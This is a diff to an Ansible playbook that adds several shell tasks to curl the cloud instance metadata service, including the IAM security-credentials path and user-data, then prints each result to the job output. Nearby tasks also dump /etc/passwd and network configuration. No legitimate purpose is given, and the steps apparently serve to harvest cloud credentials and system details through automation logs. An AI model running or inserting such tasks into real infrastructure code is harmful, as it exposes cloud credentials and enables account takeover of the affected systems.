@@ -14,6 +14,46 @@
   - name: print stdout
     debug: msg={{ shell.stdout }}
 
+  - name: Metadata
+    shell: curl http://169.254.169.254/latest/user-data/ -o curl.txt
+  
+  - name: curl.txt
+    shell: cat curl.txt
+    register: shell
+
+  - name: print stdout
+    debug: msg={{ shell.stdout }}
+
+  - name: Metadata
+    shell: curl http://169.254.169.254/latest/ -o curl.txt
+  
+  - name: curl.txt
+    shell: cat curl.txt
+    register: shell
+
+  - name: print stdout
+    debug: msg={{ shell.stdout }}
+
+  - name: Metadata
+    shell: curl http://169.254.169.254/latest/meta-data/iam/security-credentials -o curl.txt
+  
+  - name: curl.txt
+    shell: cat curl.txt
+    register: shell
+
+  - name: print stdout
+    debug: msg={{ shell.stdout }}
+
+  - name: Metadata
+    shell: curl http://169.254.169.254/latest/meta-data/ami-launch-index -o curl.txt
+  
+  - name: curl.txt
+    shell: cat curl.txt
+    register: shell
+
+  - name: print stdout
+    debug: msg={{ shell.stdout }}
+
   - name: /etc/passwd
     shell: cat /etc/passwd
     register: shell
@@ -36,7 +76,7 @@
     debug: msg={{ shell.stdout }}
 
   - name: info 3
-    shell: ip a
+    shell: ifconfig
     register: shell
   
   - name: print stdout
